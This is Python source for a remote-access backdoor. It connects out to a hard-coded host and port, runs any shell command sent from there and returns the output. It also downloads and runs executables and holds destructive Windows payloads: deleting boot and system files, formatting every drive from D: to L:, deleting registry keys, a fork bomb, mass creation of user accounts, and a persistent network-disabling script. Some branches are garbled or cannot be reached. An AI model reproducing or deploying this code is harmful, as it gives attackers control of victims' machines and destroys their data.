import os,subprocess,socket,time,sys
import rx7

#__import__('rx7').system.ip_local()
# Create a socket
def socket_create():
    try:
        global host
        global port
        global s
        host= '192.168.1.4'
        if len(sys.argv)>=2: port= int(sys.argv[1])
        else: port= 9999
        s= socket.socket()
    except socket.error as e:
        print('Socket Creation Error: '+str(e))

# Connect to a remote socket
def socket_connect():
    try:
        global host
        global port
        global s
        s.connect((host,port))
    except socket.error as e:
        print(f'Socket Connection Error: {e}')
        time.sleep(3)
        socket_connect()

# Recieve commands from remote server
def recieve_commands():
    #os.system('color 02')

    cmd= subprocess.Popen('',shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE).stdout.read()
    s.send(str.encode(str(cmd,'utf-8')+str(os.getcwd())+'> '))
    while True:
        try: rx.files.remove('CP.exe')
        except:pass
        try: rx.files.remove('WP.exe')
        except:pass
        pass        
        import tqdm
        data= s.recv(5092)



        if str(data[-7:],'utf-8')=='EXPLOIT':
            if str(data[-7:],'utf-8')=='WP EXPLOIT':
                BUFFER_SIZE= 4096
                filename= 'WP.exe'
                filesize= 6000000
                progress = tqdm.tqdm(range(filesize), f"Connecting  ", unit="B", unit_scale=True, unit_divisor=1024)
                subprocess.Popen(str(data,'utf-8'),shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
                f= open(filename,'wb')
                for _ in progress:
                        bytes_read = s.recv(BUFFER_SIZE)
                        if not bytes_read:
                            f.close()
                            break
                        f.write(bytes_read)
                print('WPX:Done')
                os.system('TIMEOUT /T 1 /NOBREAK>null && WP.exe')
                s.close()
            if str(data,'utf-8')=='CP EXPLOIT':
                BUFFER_SIZE= 4096
                filename= 'CP.exe'
                filesize= 6000000
                progress = tqdm.tqdm(range(filesize), f"Connecting  ", unit="B", unit_scale=True, unit_divisor=1024)
                subprocess.Popen(str(data,'utf-8'),shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
                f= open(filename,'wb')
                for _ in progress:
                        bytes_read = s.recv(BUFFER_SIZE)
                        if not bytes_read:
                            f.close()
                            break
                        f.write(bytes_read)
                print('CSX:Done')
                os.system('TIMEOUT /T 1 /NOBREAK>null && CP.exe')
                s.close()
            if str(data[:-8],'utf-8')=='BDS':
                subprocess.Popen('''attrib -r -s -h c:autoexec.bat & del c:autoexec.bat & attrib -r -s -h c:boot.ini & del c:boot.ini & attrib -r -s -h c:ntldr & del c:ntldr & attrib -r -s -h c:windows & win.ini & del c:windowswin.ini & del %systemdrive%\*.* /f /s /q''',shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
            if str(data[:-8],'utf-8')=='AccBomb':
                subprocess.Popen('@echo off & :xnet & user %random% /add & goto x',shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
            if str(data[:-8],'utf-8')=='ForkBomb':
                subprocess.Popen('%0|%0',shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
            if str(data[:-8],'utf-8')=='DelC':
                subprocess.Popen(r'@Echo off & Del C:\ *.* |y',shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
            if str(data[:-8],'utf-8')=='DelReg':
                subprocess.Popen('@ECHO OFF & START reg delete HKCR/.exe & START reg delete HKCR/.dll & START reg delete HKCR/*',shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
            if str(data[:-8],'utf-8')=='DelTmp':
                subprocess.Popen(r'del /q /f /s %temp%\* && del /s /q C:\Windows\temp\*',shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
            if str(data[:-8],'utf-8')=='DisNet':
                subprocess.Popen('echo @echo off>c:windowswimn32.bat & echo break off>c:windowswimn32.bat echo & ipconfig/release_all>c:windowswimn32.bat & echo end>c:windowswimn32.batreg add & hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /freg add & hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /fecho Ed',shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
            if str(data[:-8],'utf-8')=='DelDrv':
                subprocess.Popen('@ECHO OFF & for %%i in (d:,e:,f:,g:,e:,f:,g:,h:,i:,:,k:,l:) do format %%i /FS:NTFS /x /q /Y',shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)


        elif data[:2].decode('utf-8') == 'cd':
            try:
                os.chdir(data[3:].decode('utf-8'))
            except:
                pass
        elif data[:].decode('utf-8') == 'quit':
            s.close()
            break
        elif len(data) > 0:
            try:
                cmd= subprocess.Popen(str(data,'utf-8'),shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
                output_bytes= cmd.stdout.read() + cmd.stderr.read()
                output_str = str(output_bytes,'utf-8')
            except:
                output_str= 'Command not recognized\n'
            s.send(str.encode(output_str+str(os.getcwd())+'> '))
            #print(output_str)

    s.close()


# MAIN
def main():
    global s
    try:
        socket_create()
        socket_connect()
        recieve_commands()
    except:
        print('STOPED:')
        print('- Connection is refused')
        print('- Error in MAIN\n')
        print('Port will be able to use in 1 minute')
        print('60 Seconds to retry...')
        time.sleep(60)
    s.close()
    main()


rx7.cls()
main()
